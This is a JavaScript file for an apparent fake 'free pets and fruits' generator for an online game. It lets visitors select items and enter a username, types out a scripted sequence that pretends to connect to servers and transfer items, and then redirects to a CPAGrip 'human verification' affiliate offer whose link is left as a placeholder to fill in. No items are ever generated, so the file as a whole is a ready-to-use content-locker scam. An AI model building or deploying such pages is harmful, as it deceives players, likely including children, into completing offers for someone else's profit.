const pets = [
  "dragonfly", "t-rex", "mimic-octopus", "spinosaurus", "brontosaurus",
  "ankylosaurus", "disco-bee", "zombie-chicken", "queen-bee", "kitsune",
  "new-kitsune", "kappa", "raccoon", "red-fox", "fennec-fox", "butterfly"
];

const fruits = [
  "candy-blossom", "guanabana", "travelers-fruit", "sugar-apple",
  "elephant-ears", "feijoa", "loquat", "prickly-pear", "bell-pepper",
  "ember-lily", "beanstalk", "cacao", "pepper", "mushroom", "grape"
];

const cpagripOfferURL = "https://yoursubdomain.cpagrip.com/human-verification"; // Replace with your link

function formatName(name) {
  return name.replace(/-/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
}

function createImages(containerId, items) {
  const container = document.getElementById(containerId);
  items.forEach(item => {
    const div = document.createElement("div");
    div.className = "item";

    const img = document.createElement("img");
    img.src = `${item}.png`;
    img.alt = item;
    img.setAttribute("data-name", item);

    const label = document.createElement("p");
    label.textContent = formatName(item);

    div.appendChild(img);
    div.appendChild(label);
    container.appendChild(div);

    div.addEventListener("click", () => toggleSelect(div));
  });
}

const selected = new Set();

function toggleSelect(div) {
  const name = div.querySelector("img").getAttribute("data-name");
  if (div.classList.contains("selected")) {
    div.classList.remove("selected");
    selected.delete(name);
  } else {
    if (selected.size >= 3) {
      alert("You can only select up to 3 fruits/pets!");
      return;
    }
    div.classList.add("selected");
    selected.add(name);
  }
}

document.addEventListener("DOMContentLoaded", () => {
  createImages("pets-container", pets);
  createImages("fruits-container", fruits);

  document.getElementById("generateBtn").addEventListener("click", () => {
    const username = document.getElementById("username").value.trim();
    if (!username) return alert("Please enter your username!");
    if (selected.size === 0) return alert("Select at least one item!");

    const selection = Array.from(selected).join(",");
    showLoadingSequence(username, selection);
  });
});

function showLoadingSequence(username, selection) {
  const overlay = document.getElementById("loading-overlay");
  const text = document.getElementById("loading-text");
  overlay.classList.remove("hidden");

  const steps = [
    "Connecting to servers...",
    "Successfully connected.",
    "Finding username...",
    `Username found: ${username}`,
    "Generating items...",
    "Starting transfer...",
    "Verifying human...",
    "❗ Human verification required"
  ];

  let i = 0;
  function typeStep() {
    if (i >= steps.length) {
      setTimeout(() => {
        window.location.href = cpagripOfferURL;
      }, 1500);
      return;
    }

    let current = "";
    let j = 0;
    const interval = setInterval(() => {
      current += steps[i][j];
      text.textContent = current;
      j++;
      if (j >= steps[i].length) {
        clearInterval(interval);
        i++;
        setTimeout(typeStep, 900); // Wait before next line
      }
    }, 40); // Typing speed
  }

  typeStep();
}
